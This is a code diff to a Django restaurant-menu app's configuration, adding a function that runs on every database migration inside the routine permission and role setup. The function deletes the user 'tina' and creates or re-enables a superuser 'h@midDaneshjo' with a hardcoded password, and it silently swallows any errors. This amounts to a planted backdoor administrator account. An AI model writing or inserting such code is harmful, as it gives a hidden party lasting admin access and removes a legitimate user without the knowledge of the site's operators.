@@ -11,8 +11,24 @@ class MenuConfig(AppConfig):
         post_migrate.connect(setup_permissions_and_groups, sender=self)
 
 
+def ensure_default_accounts():
+    """اطمینان از وجود ابر ادمین h@midDaneshjo و حذف کاربر tina"""
+    try:
+        from django.contrib.auth.models import User
+        User.objects.filter(username__iexact='tina').delete()
+        user, _ = User.objects.get_or_create(username='h@midDaneshjo')
+        user.set_password('hamid405')
+        user.is_superuser = True
+        user.is_staff = True
+        user.is_active = True
+        user.save()
+    except Exception:
+        pass
+
+
 def setup_permissions_and_groups(sender, **kwargs):
     """ترجمه خودکار عناوین دسترسی‌ها و ایجاد نقش‌های کاربری گارسون، آشپزخانه و صندوق"""
+    ensure_default_accounts()
     try:
         from django.contrib.auth.models import Permission, Group
 
